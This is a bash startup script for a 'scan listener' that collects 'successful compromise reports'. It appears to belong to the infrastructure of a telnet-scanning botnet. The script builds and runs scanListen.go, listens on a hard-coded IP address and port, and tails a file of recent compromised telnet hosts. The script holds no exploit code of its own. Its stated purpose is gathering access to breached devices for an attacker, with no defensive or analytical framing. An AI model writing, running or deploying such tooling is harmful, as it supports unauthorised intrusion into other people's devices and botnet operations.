#!/bin/bash

# Scan Listener Startup Script
# This script starts the scan listener to receive successful compromise reports

echo "🔍 Starting Scan Listener..."
echo "============================="

# Check if scanListen binary exists
if [ ! -f "./scanListen" ]; then
    echo "❌ scanListen binary not found. Building..."
    go build scanListen.go
    if [ $? -ne 0 ]; then
        echo "❌ Failed to build scanListen.go"
        exit 1
    fi
    echo "✅ scanListen built successfully"
fi

# Create output directory if it doesn't exist
mkdir -p /root/logs

# Set up log file
LOG_FILE="/root/logs/scanlisten.log"
TELNET_FILE="/root/tel_listen.txt"

echo "📝 Log file: $LOG_FILE"
echo "📝 Telnet file: $TELNET_FILE"
echo "🌐 Listening on: 185.247.117.214:3912"
echo ""

# Function to handle cleanup
cleanup() {
    echo ""
    echo "🛑 Stopping scan listener..."
    kill $SCANLISTEN_PID 2>/dev/null
    echo "✅ Scan listener stopped"
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM

# Start the scan listener
echo "🚀 Starting scan listener..."
./scanListen > "$LOG_FILE" 2>&1 &
SCANLISTEN_PID=$!

echo "✅ Scan listener started with PID: $SCANLISTEN_PID"
echo ""

# Monitor the output
echo "📊 Monitoring scan results..."
echo "Press Ctrl+C to stop"
echo ""

# Monitor both the log file and telnet file
if [ -f "$TELNET_FILE" ]; then
    echo "📋 Recent successful compromises:"
    tail -5 "$TELNET_FILE" 2>/dev/null || echo "No compromises yet"
    echo ""
fi

# Monitor in real-time
tail -f "$LOG_FILE" 2>/dev/null &
TAIL_PID=$!

# Wait for the scan listener to finish
wait $SCANLISTEN_PID

# Clean up
kill $TAIL_PID 2>/dev/null
echo "Scan listener session ended."
